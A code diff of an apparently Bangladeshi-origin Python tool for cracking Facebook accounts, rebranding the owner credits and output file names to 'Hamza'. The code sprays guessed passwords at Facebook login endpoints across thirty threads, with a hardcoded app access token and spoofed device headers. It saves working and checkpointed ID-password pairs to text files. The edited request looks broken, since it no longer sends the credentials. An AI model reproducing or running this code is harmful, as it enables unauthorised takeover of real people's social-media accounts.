@@ -84,7 +84,7 @@ def clear():
 def back():
 	login()
  
-MURAD="murad"
+MURAD="Hamza"
 imt="-Busra4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
@@ -389,30 +389,18 @@ def follow(ses,coki):
  
 logo = ("""\033[1;32m
   
-────────────────────────────────────────────────────────────────────────────────────────
-─██████──────────██████─██████──██████─████████████████───██████████████─████████████───
-─██▒▒██████████████▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─
-─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒████████▒▒██───██▒▒██████▒▒██─██▒▒████▒▒▒▒██─
-─██▒▒██████▒▒██████▒▒██─██▒▒██──██▒▒██─██▒▒██────██▒▒██───██▒▒██──██▒▒██─██▒▒██──██▒▒██─
-─██▒▒██──██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒████████▒▒██───██▒▒██████▒▒██─██▒▒██──██▒▒██─
-─██▒▒██──██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─
-─██▒▒██──██████──██▒▒██─██▒▒██──██▒▒██─██▒▒██████▒▒████───██▒▒██████▒▒██─██▒▒██──██▒▒██─
-─██▒▒██──────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─────██▒▒██──██▒▒██─██▒▒██──██▒▒██─
-─██▒▒██──────────██▒▒██─██▒▒██████▒▒██─██▒▒██──██▒▒██████─██▒▒██──██▒▒██─██▒▒████▒▒▒▒██─
-─██▒▒██──────────██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒████─
-─██████──────────██████─██████████████─██████──██████████─██████──██████─████████████───
-────────────────────────────────────────────────────────────────────────────────────────       \033
+      \033
 __________________×______________________
   
-  Owner   :  Murad
+  Owner   : Hamza Hasan
  
   Github   :  Murad-king
  
-  Facebook : Mehedi Hasan
+  Facebook : Hamza Hasan
   
   Youtube : Bad boy
   
-  Contact :01617813890
+  Contact :01865424590
 __________________×______________________\033[1;37m""")
  
 class Main:
@@ -861,12 +849,12 @@ class Main:
 				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Hamza-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Hamza-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -885,7 +873,7 @@ class Main:
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[0;93m [+] Hamza ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
@@ -1268,32 +1256,57 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [Murad ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Hamza ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+
+    'authority': 'mbasic.facebook.com',
+
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+
+    'accept-language': 'en-US,en;q=0.9',
+
+    'cache-control': 'max-age=0',
+
+    # 'cookie': 'datr=J3DwYx7GMEC2djDPKoh66aP5; sb=J3DwY134uvL8_6fwwJ-N_9TR; locale=en_US; vpd=v1%3B723x384x1.875; wd=384x723; dnonce=AWnTEn5lLWT2wVXeSeIq57o15tN17Zh7Zn2kI4jisFKTO3K_vlIOIQS4nks4uNlgzO2SaR7yZei5YPZd86nA6HC8; fr=0FakRuj0rfumwtRte.AWWY-Mh6wB4rqEXLQ5eZoP4Ufhk.Bj8HAn.8W.AAA.0.0.Bj-O7y.AWUMN_e5Jc0',
+
+    'referer': 'https://mbasic.facebook.com/',
+
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+
+    'sec-ch-ua-mobile': '?1',
+
+    'sec-ch-ua-platform': '"Android"',
+
+    'sec-fetch-dest': 'document',
+
+    'sec-fetch-mode': 'navigate',
+
+    'sec-fetch-site': 'same-origin',
+
+    'sec-fetch-user': '?1',
+
+    'upgrade-insecure-requests': '1',
+
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+
+}
+			response =requests.get(
+
+    'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', ) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Hamza-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Hamza-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Hamza-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Hamza-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
